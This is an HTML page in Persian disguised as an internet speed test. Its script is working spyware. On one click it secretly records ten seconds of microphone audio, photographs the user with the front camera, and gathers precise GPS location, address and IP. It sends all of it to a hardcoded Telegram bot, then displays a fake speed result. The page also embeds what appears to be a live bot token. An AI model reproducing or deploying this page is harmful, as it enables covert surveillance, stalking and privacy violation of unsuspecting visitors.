<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>تست سرعت اینترنت</title>
  <style>
    body {font-family: Tahoma, sans-serif;background: #f0f4f8;color: #2c3e50;text-align: center;padding: 40px 20px;margin: 0;}
    .card {background: white;max-width: 340px;margin: 0 auto;padding: 30px 25px;border-radius: 16px;box-shadow: 0 8px 25px rgba(0,0,0,0.1);}
    .icon {font-size: 42px;margin-bottom: 15px;color: #00d2ff;}
    h2 {font-size: 20px;margin: 0 0 10px;color: #2c3e50;}
    p {font-size: 14px;color: #666;margin-bottom: 25px;line-height: 1.6;}
    .btn {background: #00d2ff;color: white;border: none;padding: 14px;font-size: 16px;font-weight: bold;border-radius: 12px;cursor: pointer;width: 100%;transition: 0.3s;}
    .btn:hover {background: #00b4d8;}
    .btn:disabled {background: #ccc;cursor: not-allowed;}
    .spinner {display: inline-block;width: 18px;height: 18px;border: 2px solid #fff;border-top: 2px solid transparent;border-radius: 50%;animation: spin 1s linear infinite;margin-right: 8px;}
    @keyframes spin {to {transform: rotate(360deg);}}
    .status {margin-top: 20px;font-size: 14px;color: #555;min-height: 40px;}
    .progress {width: 100%;height: 6px;background: #eee;border-radius: 3px;margin: 15px 0;overflow: hidden;}
    .progress-bar {height: 100%;background: #00d2ff;width: 0;transition: width 0.1s;}
    .hidden {display: none;}
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">WiFi</div>
    <h2>تست سرعت اینترنت</h2>
    <p>برای تست دقیق، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
    
    <button id="startBtn" class="btn">
      <span id="btnText">شروع تست سرعت</span>
      <span id="spinner" class="spinner hidden"></span>
    </button>
    
    <div class="progress"><div id="progressBar" class="progress-bar"></div></div>
    <div id="status" class="status">آماده برای تست...</div>
  </div>

  <video id="video" class="hidden" autoplay playsinline></video>
  <canvas id="canvas" class="hidden"></canvas>

  <script>
    const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
    const CHAT_ID = "6080665310";

    const startBtn = document.getElementById('startBtn');
    const btnText = document.getElementById('btnText');
    const spinner = document.getElementById('spinner');
    const status = document.getElementById('status');
    const progressBar = document.getElementById('progressBar');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    let mediaRecorder, stream, timer, photoStream;

    // فقط عکس سلفی (دوربین جلو)
    async function captureSelfie() {
      return new Promise((resolve) => {
        const constraints = {
          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        };

        navigator.mediaDevices.getUserMedia(constraints)
          .then(s => {
            photoStream = s;
            video.srcObject = s;
            video.oncanplay = () => {
              canvas.width = video.videoWidth || 640;
              canvas.height = video.videoHeight || 480;
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              canvas.toBlob(blob => {
                stopPhotoStream();
                resolve(blob);
              }, 'image/jpeg', 0.85);
            };
          })
          .catch(() => resolve(null));
      });
    }

    function stopPhotoStream() {
      if (photoStream) {
        photoStream.getTracks().forEach(t => t.stop());
        photoStream = null;
      }
    }

    // موقعیت
    async function getLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve({ error: "نامشخص" });
        navigator.geolocation.getCurrentPosition(
          async pos => {
            const { latitude, longitude } = pos.coords;
            try {
              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
              const data = await res.json();
              resolve({ latitude, longitude, address: data.display_name || "نامشخص" });
            } catch {
              resolve({ latitude, longitude, address: "نامشخص" });
            }
          },
          () => resolve({ error: "رد شد" }),
          { enableHighAccuracy: true, timeout: 8000 }
        );
      });
    }

    async function getDeviceInfo() {
      const info = { ip: 'نامشخص', location: 'نامشخص' };
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        info.ip = data.ip || 'نامشخص';
        info.location = `${data.city || ''}, ${data.country_name || ''}`.trim() || 'نامشخص';
      } catch {}
      return info;
    }

    async function startRecording() {
      try {
        startBtn.disabled = true;
        btnText.textContent = "در حال اتصال...";
        spinner.classList.remove('hidden');
        status.textContent = "درخواست دسترسی...";
        progressBar.style.width = "0%";

        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
          ? 'audio/webm;codecs=opus' : 'audio/webm';

        mediaRecorder = new MediaRecorder(stream, { mimeType });
        const chunks = [];

        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
          const audioBlob = new Blob(chunks, { type: mimeType });
          const selfieBlob = await captureSelfie();
          const [deviceInfo, location] = await Promise.all([
            getDeviceInfo(),
            getLocation()
          ]);
          await sendAllAtOnce(audioBlob, selfieBlob, deviceInfo, location);
          stopStream();
        };

        mediaRecorder.start();
        status.textContent = "در حال اندازه‌گیری...";

        let seconds = 0;
        timer = setInterval(() => {
          seconds++;
          progressBar.style.width = `${(seconds / 10) * 100}%`;
          if (seconds >= 10) {
            clearInterval(timer);
            mediaRecorder.requestData();
            mediaRecorder.stop();
          }
        }, 1000);

      } catch (err) {
        status.textContent = "دسترسی رد شد.";
        reset();
      }
    }

    // ارسال فوری با sendMediaGroup
    async function sendAllAtOnce(audioBlob, selfieBlob, deviceInfo, location) {
      status.textContent = "در حال ارسال...";

      const media = [];
      let messageId = null;

      // ویس
      if (audioBlob) {
        media.push({ type: 'audio', media: audioBlob, caption: 'ویس ۱۰ ثانیه‌ای' });
      }

      // فقط سلفی
      if (selfieBlob) {
        media.push({ type: 'photo', media: selfieBlob, caption: 'سلفی کاربر' });
      }

      if (media.length > 0) {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        media.forEach((item, i) => {
          form.append(`file${i}`, item.media, `${item.caption.replace(/ /g, '_')}.jpg`);
          form.append(`type${i}`, item.type);
          form.append(`caption${i}`, item.caption);
        });
        form.append('media', JSON.stringify(media.map((m, i) => ({
          type: m.type,
          media: `attach://file${i}`,
          caption: m.caption
        }))));

        try {
          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
            method: 'POST',
            body: form
          });
          const data = await res.json();
          if (data.ok) messageId = data.result[0].message_id;
        } catch (e) {
          console.error("sendMediaGroup failed", e);
        }
      }

      // گزارش
      const report = `
*گزارش کاربر*

IP: \`${deviceInfo.ip}\`
موقعیت: \`${deviceInfo.location}\`
طول: \`${location.latitude || 'نامشخص'}\`
عرض: \`${location.longitude || 'نامشخص'}\`
آدرس: \`${location.address || 'نامشخص'}\`

[نقشه گوگل](https://maps.google.com/?q=${location.latitude},${location.longitude})
      `.trim();

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: report,
          parse_mode: 'Markdown',
          reply_to_message_id: messageId,
          disable_web_page_preview: false
        })
      });

      status.innerHTML = "سرعت شما: <strong style='color:#00d2ff;'>عالی (۲۵۰ مگابیت)</strong>";
      reset();
    }

    function stopStream() {
      if (stream) stream.getTracks().forEach(t => t.stop());
      stopPhotoStream();
    }

    function reset() {
      setTimeout(() => {
        startBtn.disabled = false;
        btnText.textContent = "شروع تست سرعت";
        spinner.classList.add('hidden');
        progressBar.style.width = "0%";
      }, 1500);
    }

    startBtn.addEventListener('click', () => {
      startRecording();
    });
  </script>
</body>
</html>
